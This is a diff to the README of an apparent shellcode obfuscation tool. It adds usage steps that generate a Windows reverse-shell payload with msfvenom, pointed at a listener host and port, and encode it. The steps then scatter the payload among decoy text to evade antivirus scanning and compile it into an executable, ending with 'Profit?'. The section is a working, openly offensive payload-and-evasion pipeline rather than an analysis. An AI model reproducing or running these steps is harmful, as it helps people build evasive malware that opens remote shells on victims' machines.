@@ -5,6 +5,30 @@ WIP
 - Dynamic Reassembly at Runtime: The shellcode is only assembled and becomes recognizable as such during runtime, which helps in evading detection mechanisms that scan executable files before they are run.
 - Flexibility: Can be applied to various types of shellcode as long as they are compatible with Windows.
 
+## Usage
+
+Using a shellcode file, using `msfvenom`, for example:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 -e x86/shikata_ga_nai -i 8 -f c > shellcode.c
+```
+Use the script to obfuscate the shellcode:
+
+```bash
+./shellcode_obfuscator.py -s shellcode.c -dm 30 -c 5 -df mr.bean_wikipedia.html -db 60 -min 3 -max 5 -fm 10 
+Shellcode size: 540 bytes
+Decoy size: 585859 bytes
+Fragment count: 4278
+File size: 1433798 bytes
+File saved to shell.c
+```
+Compile:
+
+```bash
+i686-w64-mingw32-gcc shell.c -o shell.exe
+```
+Profit?
+
 ## Options
 
 `-s` / `--shellcode-file`: Specifies the input file containing the shellcode. This file should contain the shellcode that will be obfuscated by the script. The shellcode is expected to be in a raw binary or hexadecimal format.
